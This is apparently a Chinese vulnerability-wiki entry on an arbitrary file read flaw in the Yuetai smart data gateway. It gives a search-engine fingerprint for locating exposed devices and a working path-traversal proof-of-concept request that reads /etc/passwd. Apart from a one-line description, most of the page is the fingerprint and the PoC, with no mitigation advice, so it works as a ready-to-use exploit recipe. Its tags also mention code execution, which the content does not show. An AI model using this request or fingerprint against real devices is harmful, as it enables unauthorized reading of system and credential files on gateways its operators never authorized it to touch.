---
title: "悦泰节能 智能数据网关 resources 任意文件读取漏洞"
date: 2026-10-18 09:16:17
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "悦泰节能-智能数据网关"
tags:
  - "悦泰节能-智能数据网关"
  - "代码执行"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

悦泰节能 智能数据网关存在任意文件读取漏洞，通过构造特殊请求可以读取服务器任意文件

## 漏洞影响

```
悦泰节能 智能数据网关
```

## 网络测绘

```
body="/FWlib3/resources/css/xtheme-gray.cssz"
```

## 漏洞复现

登录页面

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162249593.png)

验证POC

```php
/FWlib3/resources//../../../../../../../../etc/passwd
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162249623.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E6%82%A6%E6%B3%B0%E8%8A%82%E8%83%BD-%E6%99%BA%E8%83%BD%E6%95%B0%E6%8D%AE%E7%BD%91%E5%85%B3-resources-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
